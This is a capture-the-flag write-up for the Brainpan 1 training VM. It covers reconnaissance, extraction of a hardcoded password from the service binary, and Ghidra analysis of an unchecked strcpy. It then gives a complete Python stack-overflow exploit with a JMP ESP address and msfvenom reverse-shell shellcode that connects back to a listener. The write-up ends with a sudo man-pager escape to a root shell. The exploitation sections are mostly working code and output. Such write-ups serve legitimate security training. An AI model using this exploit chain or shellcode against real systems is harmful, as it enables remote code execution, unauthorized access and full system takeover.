# Brainpan: 1

# Recon

## Port Scan

### TCP

```bash
PORT      STATE SERVICE REASON         VERSION
9999/tcp  open  abyss?  syn-ack ttl 63
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD

10000/tcp open  http    syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
```

### tcp/9999?

- Looks like some custom service running on this port.

```bash
┌──(kali㉿kali)-[~]
└─$ nc 10.0.1.2 9999          
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 
```

- Further testing required

### tcp/10000?

- SimpleHTTPServer 0.6 (Python 2.7.3)

<img width="1087" height="917" alt="image" src="https://github.com/user-attachments/assets/942956e5-b124-4faa-8552-d9b50690a49b" />


```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.1.2:10000/
<html>
<body bgcolor="ffffff">
<center>
<!-- infographic from http://www.veracode.com/blog/2012/03/safe-coding-and-software-security-infographic/ -->
<img src="soss-infographic-final.png">
</center>
</body>
</html>
```

- We’ll need to check for interesting files or directories.

### UDP

- A UDP scan was not necessary for this machine.

## Web Enumeration

```bash
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://10.0.1.2:10000/                

  _|. _ _  _  _  _ _|_    v0.4.3  
 (_||| _) (/_(_|| (_| )                                                                                                                               
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.0.1.2_10000/__25-12-02_17-32-46.txt

Target: http://10.0.1.2:10000/

[17:32:46] Starting:                                                                                                                                                          
[17:32:54] 301 -    0B  - /bin  ->  /bin/                                   
[17:32:54] 200 -  230B  - /bin/
                                                                             
Task Completed  
```

### Directory listing for /bin/

<img width="1087" height="917" alt="image 1" src="https://github.com/user-attachments/assets/c5830976-f461-4f2e-b8fd-c7d72ef7b43a" />

## File Inspection (brainpan.exe)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ file brainpan.exe 
brainpan.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 (stripped to external PDB), 5 sections

┌──(kali㉿kali)-[~/Downloads]
└─$ strings brainpan.exe 
!This program cannot be run in DOS mode.
.text
`.data
.rdata
@.bss
.idata
[^_]
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
[^_]
[get_reply] s = [%s]
[get_reply] copied %d bytes to buffer
shitstorm
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|
[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              
                          >> 
                          ACCESS DENIED
                          ACCESS GRANTED
```

- This program is what seems to be running on the target
- Managed to retrieve a password (`shitstorm`) which allows us to authenticate to the service running on port 9999

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc 10.0.1.2 9999    
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> shitstorm
                          ACCESS GRANTED  
```

- We are immediately disconnected from the target which leads us to believe that this is just a network password-checking service
- Further inspection of the strings extracted from `brainpan.exe` suggests an unchecked copy of user input into a fixed-size buffer, which opens the door to memory corruption.

```xml
[get_reply] s = [%s]
[get_reply] copied %d bytes to buffer
shitstorm
[+] initializing winsock...
[!] winsock init failed: %d
done.
[!] could not create socket: %d
[+] server socket created.
[!] bind failed: %d
[+] bind done on port %d
[+] waiting for connections.
[+] received connection.
[+] check is %d
[!] accept failed: %d
[+] cleaning up.
```
# Exploitation

## Finding the Offset

- I used Ghidra to dig further into `brainpan.exe` and extracted the function below:

```c
void __cdecl get_reply(char *param_1) {
    char local_20c[520];
    
    printf("[get_reply] s = [%s]\n");
    strcpy(local_20c, param_1);
    strlen(local_20c);
    printf("[get_reply] copied %d bytes to buffer\n");
    strcmp(local_20c, "shitstorm\n");
    
    return;
}
```

- The `get_reply()` function allocates a 520-byte stack buffer and uses `strcpy()` to copy user-controlled input without bounds checking.
- This guarantees that any input longer than the buffer will overwrite the stack frame.
- From static analysis alone, the offset to overwrite EIP is 524 bytes (520 bytes for the buffer + 4 bytes for the saved EBP).
- We can confirm the offset with a cyclic pattern using `msf-pattern_create` and `*msf-pattern_offset` , although this wasn’t needed to proceed in this case.

## Finding Bad Characters

- The null byte (`\x00`) was excluded as a bad character because `strcpy()` terminates on null bytes.
- We then check for any other bad characters that we need to exclude when generating our shellcode using the script below:

```python
import socket, sys

badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

payload = b"A"*520 + b"B"*4 + badchars #Junk + saved EBP + badchars

try:
	s = socket.socket()
	s.connect(('10.0.1.2', 9999))
	s.send(payload)
	s.close()
except:
	print("Failed")
	sys.exit() 
```

- Inspecting the stack dump in the debugger confirmed that the rest of the character set is valid for payload generation.

## Finding the Right Module

- We are looking for a part of the application (either the executable itself or a loaded DLL) that lacks memory protections.
- In this case, it’s `brainpan.exe` itself as both ASLR and DEP are disabled; `DllCharacteristics` field has the value **`0x0000` .**

<img width="1904" height="710" alt="image 2" src="https://github.com/user-attachments/assets/552ade3b-7146-4d97-8e97-086bcba5f349" />

- We used Search to find the opcode for **`JMP ESP`** which is **`FF E4` ,** and found the address **`0x311712F3`** with no bad characters
- The `JMP ESP` instruction transfers execution to whatever ESP is pointing to, which will be the padding before our shellcode at the time of payload execution

<img width="1904" height="710" alt="image 3" src="https://github.com/user-attachments/assets/4342e13d-8554-40ef-b890-184446b82674" />

## Generating Shellcode

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.2 LPORT=4444 EXITFUNC=thread -f py -a x86 -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 479 bytes
buf =  b""
buf += b"\xb8\x57\x75\x46\xf0\xd9\xe8\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x12\x83\xc2\x04\x31\x42\x0e\x03\x15"
buf += b"\x7b\xa4\x05\xa8\x58\xdf\x05\x99\x1d\x73\xa0\x1f"
buf += b"\x2b\x92\x84\x79\xe6\xd5\x76\xdc\x48\xea\xb5\x5e"
buf += b"\xe1\x6c\xbf\x36\xf8\x8e\x3f\xc4\x94\x8c\x3f\xd9"
buf += b"\x38\x18\xde\x69\xa6\x4a\x70\xda\x94\x68\xfb\x3d"
buf += b"\x17\xee\xa9\xd5\xc6\xc0\x3e\x4d\x7f\x30\xee\xef"
buf += b"\x16\xc7\x13\xbd\xbb\x5e\x32\xf1\x37\xac\x35"
```

- We used the payload `linux/x86/shell_reverse_tcp` because we know that the target is running Ubuntu.

## Final Exploit

```python
import socket, sys

buf =  b""
buf += b"\xb8\x57\x75\x46\xf0\xd9\xe8\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x12\x83\xc2\x04\x31\x42\x0e\x03\x15"
buf += b"\x7b\xa4\x05\xa8\x58\xdf\x05\x99\x1d\x73\xa0\x1f"
buf += b"\x2b\x92\x84\x79\xe6\xd5\x76\xdc\x48\xea\xb5\x5e"
buf += b"\xe1\x6c\xbf\x36\xf8\x8e\x3f\xc4\x94\x8c\x3f\xd9"
buf += b"\x38\x18\xde\x69\xa6\x4a\x70\xda\x94\x68\xfb\x3d"
buf += b"\x17\xee\xa9\xd5\xc6\xc0\x3e\x4d\x7f\x30\xee\xef"
buf += b"\x16\xc7\x13\xbd\xbb\x5e\x32\xf1\x37\xac\x35"

payload = b"A"*520 + b"B"*4 #Junk + EBP
payload += b"\xf3\x12\x17\x31" #JMP ESP
payload += b"\x90"*16 #NOP Sled
payload += buf #Shellcode

try:
	s = socket.socket()
	s.connect(('10.0.1.2', 9999))
	s.send(payload)
	s.close()
except:
	print("Failed")
	sys.exit() 
```

- Once executed, we get a reverse shell as user `puck`:

```python
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444     
listening on [any] 4444 ...
connect to [10.0.0.2] from (UNKNOWN) [10.0.1.2] 40865
whoami
puck
```

# Post-Exploitation

## Discovery

### Contents of checksrv.sh

```bash
#!/bin/bash
# run brainpan.exe if it stops
lsof -i:9999
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep brainpan.exe | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
                killall wineserver
                killall winedevice.exe
        fi
        /usr/bin/wine /home/puck/web/bin/brainpan.exe &
fi 

# run SimpleHTTPServer if it stops
lsof -i:10000
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
        fi
        cd /home/puck/web
        /usr/bin/python -m SimpleHTTPServer 10000
fi 
```

- Found a script that runs `brainpan.exe` and the python server on target if they stop, which explains why we didn’t have to restart the VM when we were testing for buffer overflow.
- The EXE file is running under Wine as expected.

### Users

```bash
swdk@brainpan:/home/puck$ awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd
reynard
anansi
puck
```

- We identified 2 more users (`reynard` and `anansi`), but we don’t have permissions to access their home directories.

```bash
puck@brainpan:/home/puck$ ls -l /home/
total 12
drwx------ 4 anansi  anansi  4096 Mar  4  2013 anansi
drwx------ 7 puck    puck    4096 Mar  6  2013 puck
drwx------ 3 reynard reynard 4096 Mar  4  2013 reynard
```

### Permissions

```bash
puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

- User `puck` is allowed to run `/home/anansi/bin/anansi_util` under `sudo` without having to enter a password.

```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

- The output suggests that this is an internal tool used to perform system management tasks.
- Further testing revealed that the respective commands being used in each of the actions are `ip addr`, `top` and `man`

```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util network
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 08:00:27:90:47:5f brd ff:ff:ff:ff:ff:ff
    inet 10.0.1.2/24 brd 10.0.1.255 scope global eth0
    inet6 fe80::a00:27ff:fe90:475f/64 scope link 
       valid_lft forever preferred_lft forever

puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist
top - 08:51:35 up 17:10,  0 users,  load average: 0.00, 0.01, 0.05
Tasks:  83 total,   1 running,  82 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni, 99.9 id,  0.1 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem:    248936 total,   244620 used,     4316 free,    62196 buffers
KiB Swap:   520188 total,        0 used,   520188 free,    86800 cached

  PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND           
    1 root      20   0  3472 1836 1280 S   0.0  0.7   0:00.22 init              
    2 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kthreadd          
    3 root      20   0     0    0    0 S   0.0  0.0   0:00.28 ksoftirqd/0       
    4 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kworker/0:0       
    6 root      rt   0     0    0    0 S   0.0  0.0   0:00.00 migration/0       
    7 root      rt   0     0    0    0 S   0.0  0.0   0:00.18 watchdog/0        
    8 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 cpuset            
    9 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 khelper           
   10 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kdevtmpfs         
   11 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 netns             
   12 root      20   0     0    0    0 S   0.0  0.0   0:00.11 sync_supers       
   13 root      20   0     0    0    0 S   0.0  0.0   0:00.00 bdi-default       
   14 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kintegrityd       
   15 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kblockd           
   16 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 ata_sff           
   17 root      20   0     0    0    0 S   0.0  0.0   0:00.00 khubd             
   18 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 md                

puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man
MAN(1)                        Manual pager utils                        MAN(1)

NAME
       man - an interface to the on-line reference manuals

SYNOPSIS
       man  [-C  file]  [-d]  [-D]  [--warnings[=warnings]]  [-R encoding] [-L
       locale] [-m system[,...]] [-M path] [-S list]  [-e  extension]  [-i|-I]
       [--regex|--wildcard]   [--names-only]  [-a]  [-u]  [--no-subpages]  [-P
       pager] [-r prompt] [-7] [-E encoding] [--no-hyphenation] [--no-justifi‐
       cation]  [-p  string]  [-t]  [-T[device]]  [-H[browser]] [-X[dpi]] [-Z]

```

- We are unable to exploit **`network`** and **`proclist`** actions in **`anansi_util`** to escalate privileges because they execute simple, non-interactive system commands that don't provide a mechanism to break out into a shell.

## Privilege Escalation

- Because **`man`** uses a pager to display content, and these pagers allow execution of shell commands, we can break out of the pager to get a shell.
- Since `anansi_util` is ran with `sudo`, this new shell will be a root shell.

```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man

MAN(1)                        Manual pager utils                        MAN(1)

NAME
       man - an interface to the on-line reference manuals

SYNOPSIS
       man  [-C  file]  [-d]  [-D]  [--warnings[=warnings]]  [-R encoding] [-L
       locale] [-m system[,...]] [-M path] [-S list]  [-e  extension]  [-i|-I]
       [--regex|--wildcard]   [--names-only]  [-a]  [-u]  [--no-subpages]  [-P
       pager] [-r prompt] [-7] [-E encoding] [--no-hyphenation] [--no-justifi‐
       cation]  [-p  string]  [-t]  [-T[device]]  [-H[browser]] [-X[dpi]] [-Z]
       [[section] page ...] ...
       man -k [apropos options] regexp ...
       man -K [-w|-W] [-S list] [-i|-I] [--regex] [section] term ...
       man -f [whatis options] page ...
       man -l [-C file] [-d] [-D] [--warnings[=warnings]]  [-R  encoding]  [-L
       locale]  [-P  pager]  [-r  prompt]  [-7] [-E encoding] [-p string] [-t]
       [-T[device]] [-H[browser]] [-X[dpi]] [-Z] file ...
       man -w|-W [-C file] [-d] [-D] page ...
       man -c [-C file] [-d] [-D] page ...
       man [-hV]

DESCRIPTION
!/bin/bash

root@brainpan:/usr/share/man# 
```
